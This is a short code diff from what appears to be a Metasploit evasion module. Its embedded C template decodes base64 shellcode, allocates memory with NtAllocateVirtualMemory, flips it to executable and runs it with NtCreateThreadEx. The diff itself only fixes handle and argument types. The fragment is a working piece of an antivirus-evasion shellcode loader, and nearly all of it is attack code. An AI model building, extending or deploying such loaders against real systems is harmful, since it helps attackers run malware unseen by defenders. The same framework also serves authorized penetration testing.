@@ -462,8 +462,7 @@ class MetasploitModule < Msf::Evasion
             PBYTE shellcode = (PBYTE)malloc(b64len);
             SIZE_T size = base64decode(shellcode, enc_shellcode, b64len);
             PVOID bAddress = NULL;
-            int process_id = GetCurrentProcessId();
-            cID.UniqueProcess = process_id;
+            cID.UniqueProcess = ULongToHandle(GetCurrentProcessId());
             NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &OA, &cID);
             NtAllocateVirtualMemory(pHandle, &bAddress, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             int n = 0;
@@ -490,7 +489,7 @@ class MetasploitModule < Msf::Evasion
             NtProtectVirtualMemory(pHandle, &bAddress, &size, PAGE_EXECUTE, &old);
             #{s if datastore['SLEEP'] > 0};
             HANDLE thread = NULL;
-            NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL, pHandle, exec, bAddress, NULL, NULL, NULL, NULL, NULL);
+            NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL, pHandle, exec, bAddress, 0, 0, 0, 0, NULL);
             WaitForSingleObject(thread, INFINITE);
             NtClose(thread);
             NtClose(pHandle);
